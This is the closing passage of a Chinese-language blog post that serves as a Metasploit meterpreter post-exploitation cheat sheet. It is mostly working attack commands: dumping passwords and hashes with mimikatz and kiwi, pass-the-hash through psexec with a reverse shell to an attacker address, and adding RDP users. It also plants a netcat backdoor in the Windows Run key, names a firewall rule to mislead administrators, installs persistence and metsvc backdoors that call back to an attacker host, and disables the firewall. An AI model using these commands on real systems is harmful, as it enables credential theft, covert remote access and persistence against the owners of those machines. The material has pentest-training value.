<h4 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">load mimikatz <span class="comment"># 加载mimikatz模块</span></span><br><span class="line">msv  <span class="comment"># 获取用户和hash值</span></span><br><span class="line">kerberos  <span class="comment"># 获取内存中的明文密码信息</span></span><br><span class="line">wdigest  <span class="comment"># 获取内存中的明文密码信息</span></span><br><span class="line">mimikatz_<span class="built_in">command</span> <span class="_">-f</span> a:: <span class="comment"># 需要以错误的模块来让正确的模块显示</span></span><br><span class="line">mimikatz_<span class="built_in">command</span> <span class="_">-f</span> sekurlsa::searchPasswords <span class="comment"># 获取用户密码</span></span><br><span class="line">mimikatz_<span class="built_in">command</span> <span class="_">-f</span> samdump::hashes  <span class="comment"># 执行用户hash</span></span><br></pre></td></tr></table></figure>
<h4 id="kiwi"><a href="#kiwi" class="headerlink" title="kiwi"></a>kiwi</h4><p>kiwi 是利用的 mimikatz 扩展，运行需要 SYSTEM 权限</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">load kiwi</span><br><span class="line">creds_all</span><br></pre></td></tr></table></figure>
<h3 id="哈希传递"><a href="#哈希传递" class="headerlink" title="哈希传递"></a>哈希传递</h3><p>利用 hashdump 得到用户的 hash 后可利用 psexec 模块进行哈希传递攻击。<br>使用 psexec 的前提：SMB 服务必须开启，也就是开启 445 端口；Admin\$可以访问。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/psexec</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST 192.168.183.147</span><br><span class="line"><span class="built_in">set</span> LPORT 443</span><br><span class="line"><span class="built_in">set</span> RHOST 192.168.183.154</span><br><span class="line"><span class="built_in">set</span> SMBUSER Administrator</span><br><span class="line"><span class="built_in">set</span> SMBPASS ccf**4ee:3db**678</span><br><span class="line"><span class="built_in">set</span> SMBDOMAIN  WORKGROUP   <span class="comment"># 域用户需要设置SMBDOMAIN</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure>
<h3 id="RDP"><a href="#RDP" class="headerlink" title="RDP"></a>RDP</h3><h4 id="enable-rdp-脚本"><a href="#enable-rdp-脚本" class="headerlink" title="enable_rdp 脚本"></a>enable_rdp 脚本</h4><p>通过 enable_rdp 脚本将用户添加到远程桌面用户组和管理员用户组</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/manage/<span class="built_in">enable</span>_rdp  <span class="comment">#开启远程桌面</span></span><br><span class="line">run post/windows/manage/<span class="built_in">enable</span>_rdp USERNAME=admin PASSWORD=admin <span class="comment"># 添加用户</span></span><br><span class="line">run post/windows/manage/<span class="built_in">enable</span>_rdp FORWARD=<span class="literal">true</span> LPORT=6667  <span class="comment"># 将3389端口转发到6667</span></span><br></pre></td></tr></table></figure>
<h3 id="注册表操作"><a href="#注册表操作" class="headerlink" title="注册表操作"></a>注册表操作</h3><h4 id="注册表基本命令"><a href="#注册表基本命令" class="headerlink" title="注册表基本命令"></a>注册表基本命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">reg –h  # 查看帮助</span><br><span class="line">-k 注册表的路径 -v 键的名称 -d 键值</span><br><span class="line">reg enumkey [-k &lt;key&gt;]  # 枚举注册表的内容</span><br><span class="line">reg createkey [-k &lt;key&gt;]  # 创建注册表项</span><br><span class="line">reg deletekey [-k &lt;key&gt;]  # 删除注册表项</span><br><span class="line">reg setval [-k &lt;key&gt; -v &lt;val&gt; -d &lt;data&gt;]  # 在注册表里添加内容</span><br><span class="line">reg deleteval [-k &lt;key&gt; -v &lt;val&gt;]  # 删除注册表的值</span><br><span class="line">reg queryval [-k &lt;key&gt; -v &lt;val&gt;]  # 查询注册表的值</span><br></pre></td></tr></table></figure>
<h4 id="利用注册表添加-nc-后门"><a href="#利用注册表添加-nc-后门" class="headerlink" title="利用注册表添加 nc 后门"></a>利用注册表添加 nc 后门</h4><p>1.编辑注册表，添加 nc 到系统启动项中，形成后门程序。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32 <span class="comment"># 上传nc到目标主机</span></span><br><span class="line">reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run   <span class="comment"># 枚举注册表run下的键值</span></span><br><span class="line">reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v <span class="built_in">test</span>_nc <span class="_">-d</span> <span class="string">'C:\windows\system32\nc.exe -Ldp 443 -e cmd.exe'</span> <span class="comment"># 设置键值 -v 键的名称 -d 键值</span></span><br><span class="line">reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v <span class="built_in">test</span>_nc   <span class="comment"># 查看test_nc的键值</span></span><br></pre></td></tr></table></figure>
<p>2.设置防火墙允许通过 443 端口（如果目标主机开启防火墙，没有设置相应的规则可能会导致连接失败。）</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">netsh firewall show opmode <span class="comment"># 查看防火墙状态</span></span><br><span class="line">netsh firewall add portopening TCP 443 <span class="string">"网络发现(Pub PSD-Out)"</span> ENABLE ALL <span class="comment"># 添加防火墙的规则允许443端口通过(这里“网络发现(Pub PSD-Out)”是规则名称，目的是为了迷惑管理员。)</span></span><br></pre></td></tr></table></figure>
<p>3.待目标主机重启后，自启 nc 程序，然后我们利用 nc 连接即可</p>
<h3 id="后门植入"><a href="#后门植入" class="headerlink" title="后门植入"></a>后门植入</h3><h4 id="Persistence-通过启动项安装"><a href="#Persistence-通过启动项安装" class="headerlink" title="Persistence(通过启动项安装)"></a>Persistence(通过启动项安装)</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">run persistence –h  <span class="comment"># 查看帮助</span></span><br><span class="line">run persistence -X -i 5 -p 4444 -r 192.168.183.147</span><br><span class="line">run persistence -U -i 5 -p 4444 -r 192.168.183.147 -L c:\\Windows\\System32</span><br><span class="line">-X：设置后门在系统启动后自启动。该方式会在HKLM\Software\Microsoft\Windows\CurrentVersion\Run下添加注册表信息。由于权限原因会导致添加失败，后门无法启动。因此在非管理员权限下，不推荐使用该参数</span><br><span class="line">-U：设置后门在用户登录后自启动。该方式会在HKCU\Software\Microsoft\Windows\CurrentVersion\Run下添加注册表信息</span><br><span class="line">-L：后门传到远程主机的位置默认为%TEMP%</span><br><span class="line">-i：设置反向连接间隔时间为5秒</span><br><span class="line">-p：设置反向连接的端口号</span><br><span class="line">-r：设置反向连接的ip地址</span><br></pre></td></tr></table></figure>
<h4 id="Metsvc-通过服务安装-植入后门"><a href="#Metsvc-通过服务安装-植入后门" class="headerlink" title="Metsvc(通过服务安装)植入后门"></a>Metsvc(通过服务安装)植入后门</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">run metsvc -h   <span class="comment"># 查看帮助</span></span><br><span class="line">run metsvc -A   <span class="comment"># 自动安装后门</span></span><br><span class="line">run metsvc -r   <span class="comment"># 删除后门</span></span><br><span class="line"></span><br><span class="line">连接后门</span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload windows/metsvc_<span class="built_in">bind</span>_tcp</span><br><span class="line"><span class="built_in">set</span> rhost 192.168.183.169</span><br><span class="line"><span class="built_in">set</span> lport 31337</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
<h3 id="windows-cmd-常用"><a href="#windows-cmd-常用" class="headerlink" title="windows cmd 常用"></a>windows cmd 常用</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">whoami  <span class="comment"># 当前权限</span></span><br><span class="line">quser  <span class="comment"># 查询当前在线的管理员</span></span><br><span class="line">net user  <span class="comment"># 查看存在用户</span></span><br><span class="line">net user 用户名 密码 /add  <span class="comment"># 添加用户和对应密码</span></span><br><span class="line">net localgroup 用户组名 用户名 /add  <span class="comment"># 将指定用户添加到指定用户组</span></span><br><span class="line">netstat -ano  <span class="comment"># 查询当前计算机中网络连接通信情况，LISTENING表示该端口处于监听状态；ESTABLISHED表示该端口处于工作（通信）状态</span></span><br><span class="line">systeminfo  <span class="comment"># 查看当前计算机中的详细情况</span></span><br><span class="line">tasklist /svc  <span class="comment"># 查看每个进程所对应的服务</span></span><br><span class="line">taskkill /f /im 程序名称  <span class="comment"># 结束某个指定名称的程序</span></span><br><span class="line">taskkill /f /PID ID  <span class="comment"># 结束某个指定PID的进程</span></span><br><span class="line">tasklist | findstr <span class="string">"字符串"</span> <span class="comment"># 查找输出结果中指定的内容</span></span><br><span class="line">logoff  <span class="comment"># 注销某个指定用户的ID</span></span><br><span class="line">shutdown -r  <span class="comment"># 重启当前计算机</span></span><br><span class="line">netsh adcfirewall <span class="built_in">set</span> allprofiles state off  <span class="comment"># 关闭防火墙</span></span><br></pre></td></tr></table></figure>
<p>参考：<a href="https://xz.aliyun.com/t/6400" target="_blank" rel="external">https://xz.aliyun.com/t/6400</a></p>

      
    </div>

    <div>
      
        

      
    </div>

    <div>
      
        

      
    </div>

    <div>
      
        
  <ul class="post-copyright">
    <li class="post-copyright-author">
      <strong>本文作者：</strong>
      Myths
    </li>
    <li class="post-copyright-link">
      <strong>本文链接：</strong>
      <a href="http://myt0.com/2020/03/06/meterpreter/" title="meterpreter">http://myt0.com/2020/03/06/meterpreter/</a>
    </li>
    <li class="post-copyright-license">
      <strong>版权声明： </strong>
      本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" rel="external nofollow" target="_blank">CC BY-NC-ND 4.0</a> 许可协议。转载请注明出处！
    </li>
  </ul>


      
    </div>

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/metasploit/" rel="tag"># metasploit</a>
          
            <a href="/tags/meterpreter/" rel="tag"># meterpreter</a>
          
            <a href="/tags/pentest/" rel="tag"># pentest</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2020/02/28/xxe总结/" rel="next" title="xxe 漏洞分析">
                <i class="fa fa-chevron-left"></i> xxe 漏洞分析
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
          </div>
        </div>
      

      
      
    </footer>
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          
  <div class="comments" id="comments">
    
      <div id="lv-container" data-id="city" data-uid="MTAyMC8yOTQxMi81OTgw"></div>
    
  </div>


        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <img class="site-author-image" itemprop="image"
               src="/logo.jpg"
               alt="Myths" />
          <p class="site-author-name" itemprop="name">Myths</p>
           
              <p class="site-description motion-element" itemprop="description">Funny world, lonely world</p>
          
        </div>
        <nav class="site-state motion-element">

          
            <div class="site-state-item site-state-posts">
              <a href="/archives/">
                <span class="site-state-item-count">23</span>
                <span class="site-state-item-name">日志</span>
              </a>
            </div>
          

          
            
            
            <div class="site-state-item site-state-categories">
              <a href="/categories/index.html">
                <span class="site-state-item-count">4</span>
                <span class="site-state-item-name">分类</span>
              </a>
            </div>
          

          
            
            
            <div class="site-state-item site-state-tags">
              <a href="/tags/index.html">
                <span class="site-state-item-count">28</span>
                <span class="site-state-item-name">标签</span>
              </a>
            </div>
          

        </nav>

        
          <div class="feed-link motion-element">
            <a href="/atom.xml" rel="alternate">
              <i class="fa fa-rss"></i>
              RSS
            </a>
          </div>
        

        <div class="links-of-author motion-element">
          
        </div>

        
        

        
        

        


      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#低级-shell-升级到-meterpreter"><span class="nav-number">1.</span> <span class="nav-text">低级 shell 升级到 meterpreter</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#基础命令"><span class="nav-number">2.</span> <span class="nav-text">基础命令</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#网络信息"><span class="nav-number">2.1.</span> <span class="nav-text">网络信息</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#文件操作"><span class="nav-number">2.2.</span> <span class="nav-text">文件操作</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#键盘鼠标"><span class="nav-number">2.3.</span> <span class="nav-text">键盘鼠标</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#键盘记录"><span class="nav-number">2.4.</span> <span class="nav-text">键盘记录</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#执行文件"><span class="nav-number">2.5.</span> <span class="nav-text">执行文件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#timestomp-伪造时间戳"><span class="nav-number">2.6.</span> <span class="nav-text">timestomp 伪造时间戳</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#migrate"><span class="nav-number">2.7.</span> <span class="nav-text">migrate</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#portfwd-端口转发"><span class="nav-number">2.8.</span> <span class="nav-text">portfwd 端口转发</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sniffer-抓包"><span class="nav-number">2.9.</span> <span class="nav-text">sniffer 抓包</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#令牌窃取"><span class="nav-number">2.10.</span> <span class="nav-text">令牌窃取</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#网络摄像头"><span class="nav-number">2.11.</span> <span class="nav-text">网络摄像头</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#截屏"><span class="nav-number">2.12.</span> <span class="nav-text">截屏</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#清除日志"><span class="nav-number">2.13.</span> <span class="nav-text">清除日志</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#后渗透脚本"><span class="nav-number">3.</span> <span class="nav-text">后渗透脚本</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#添加路由，横向渗透"><span class="nav-number">3.1.</span> <span class="nav-text">添加路由，横向渗透</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#各平台通用"><span class="nav-number">3.2.</span> <span class="nav-text">各平台通用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#提权"><span class="nav-number">3.2.1.</span> <span class="nav-text">提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Gather"><span class="nav-number">3.2.2.</span> <span class="nav-text">Gather</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Manage"><span class="nav-number">3.2.3.</span> <span class="nav-text">Manage</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#linux"><span class="nav-number">3.3.</span> <span class="nav-text">linux</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Gather-1"><span class="nav-number">3.3.1.</span> <span class="nav-text">Gather</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Manage-1"><span class="nav-number">3.3.2.</span> <span class="nav-text">Manage</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#windows"><span class="nav-number">3.4.</span> <span class="nav-text">windows</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#命令列表"><span class="nav-number">3.4.1.</span> <span class="nav-text">命令列表</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#提权-1"><span class="nav-number">3.4.2.</span> <span class="nav-text">提权</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#getsystem"><span class="nav-number">3.4.2.1.</span> <span class="nav-text">getsystem</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#根据补丁提权"><span class="nav-number">3.4.2.2.</span> <span class="nav-text">根据补丁提权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#绕过-UAC-提权"><span class="nav-number">3.4.2.3.</span> <span class="nav-text">绕过 UAC 提权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#使用-RunAs-提权"><span class="nav-number">3.4.2.4.</span> <span class="nav-text">使用 RunAs 提权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#假冒令牌提权"><span class="nav-number">3.4.2.5.</span> <span class="nav-text">假冒令牌提权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#利用-AlwaysInstallElevated-提权"><span class="nav-number">3.4.2.6.</span> <span class="nav-text">利用 AlwaysInstallElevated 提权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#生成-MSI-安装文件"><span class="nav-number">3.4.2.7.</span> <span class="nav-text">生成 MSI 安装文件</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#窃取-hash"><span class="nav-number">3.4.3.</span> <span class="nav-text">窃取 hash</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#hashdump"><span class="nav-number">3.4.3.1.</span> <span class="nav-text">hashdump</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#mimikatz"><span class="nav-number">3.4.3.2.</span> <span class="nav-text">mimikatz</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#kiwi"><span class="nav-number">3.4.3.3.</span> <span class="nav-text">kiwi</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#哈希传递"><span class="nav-number">3.4.4.</span> <span class="nav-text">哈希传递</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#RDP"><span class="nav-number">3.4.5.</span> <span class="nav-text">RDP</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#enable-rdp-脚本"><span class="nav-number">3.4.5.1.</span> <span class="nav-text">enable_rdp 脚本</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#注册表操作"><span class="nav-number">3.4.6.</span> <span class="nav-text">注册表操作</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#注册表基本命令"><span class="nav-number">3.4.6.1.</span> <span class="nav-text">注册表基本命令</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#利用注册表添加-nc-后门"><span class="nav-number">3.4.6.2.</span> <span class="nav-text">利用注册表添加 nc 后门</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#后门植入"><span class="nav-number">3.4.7.</span> <span class="nav-text">后门植入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Persistence-通过启动项安装"><span class="nav-number">3.4.7.1.</span> <span class="nav-text">Persistence(通过启动项安装)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Metsvc-通过服务安装-植入后门"><span class="nav-number">3.4.7.2.</span> <span class="nav-text">Metsvc(通过服务安装)植入后门</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#windows-cmd-常用"><span class="nav-number">3.4.8.</span> <span class="nav-text">windows cmd 常用</span></a></li></ol></li></ol></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright" >
  
  &copy; 
  <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Myths</span>
</div>


<!--<div class="powered-by">
  Copyright © 2017 Myths
</div>-->

<!--<div class="theme-info">
  主题 -
  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
    NexT.Mist
  </a>
</div>-->


        
<div class="busuanzi-count">
  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

  
    <span class="site-uv">
      <i class="fa fa-user"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
      
    </span>
  

  
    <span class="site-pv">
      <i class="fa fa-eye"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
      
    </span>
  
</div>


        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>

  
  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>

  
  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.1"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.1"></script>



  
  

  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.1"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.1"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.1"></script>



    
    <script type="text/javascript">
      (function(d, s) {
        var j, e = d.getElementsByTagName(s)[0];
        if (typeof LivereTower === 'function') { return; }
        j = d.createElement(s);
        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
        j.async = true;
        e.parentNode.insertBefore(j, e);
      })(document, 'script');
    </script>
  


  





  

  

  

  

  

  

</body>
</html>
